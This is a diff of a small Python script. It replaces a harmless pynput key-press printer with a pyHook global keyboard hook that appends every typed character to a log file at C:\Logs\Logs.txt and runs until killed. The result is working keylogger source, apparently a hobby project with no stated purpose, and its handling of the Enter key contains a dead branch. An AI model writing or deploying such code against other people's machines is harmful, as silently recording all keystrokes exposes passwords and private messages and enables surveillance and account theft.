@@ -1,28 +1,7 @@
 import sys
 import os
-import pynput
-
-from pynput.keyboard import Key, Listener
-
-
-def on_press(key):
-    print('{0} pressed'.format(
-        key))
-
-
-def on_release(key):
-    print('{0} release'.format(
-        key))
-    if key == Key.esc:
-        # Stop listener
-        return False
-
-
-# Collect events until released
-with Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
-    listener.join()
+import pyHook
+import pythoncom
 
 
 class Logger:
@@ -45,6 +24,25 @@ class Logger:
                 print(line)
 
 
-log = Logger("Logs.txt")
-log.write_to_file("Logs from the keyboard will be stored here.")
+log = Logger("C:\\Logs\\Logs.txt")
+
+
+# Logging of each character as its corresponding Acsii format.
+def on_press(event):
+    if event.Ascii:
+        char = chr(event.Ascii)
+        log.append_to_file(char)
+    elif event.Ascii == 13:
+        char = chr(event.Ascii)
+        log.append_to_file("\n")
+        log.append_to_file(char)
+    return True
+
+
+proc = pyHook.HookManager()
+proc.KeyDown = on_press
+proc.HookKeyboard()
+pythoncom.PumpMessages()
 log.read_from_file()
+
+
